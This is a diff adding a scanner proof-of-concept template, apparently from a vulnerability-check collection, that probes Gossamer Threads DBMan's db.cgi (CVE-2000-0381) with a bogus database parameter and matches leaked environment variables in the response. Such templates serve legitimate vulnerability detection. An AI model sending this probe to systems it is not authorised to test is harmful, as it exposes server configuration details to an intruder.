@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "AVE-2000-0316 信息泄露漏洞验证 PoC，检测 Gossamer Threads DBMan db.cgi 是否泄露环境变量"
+id = "POC-AVE-2000-0316"
+name = "CVE-2000-0381 PoC"
+severity = "medium"
+tags = ["cve-2000-0381"]
+vuln_id = [
+    "CVE-2000-0381",
+    "AVE-2000-0316",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/db.cgi"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "GATEWAY_INTERFACE",
+    "PATH",
+    "SERVER_SOFTWARE",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[poc.requests.query_params]
+db = "nonexistent_db_12345"
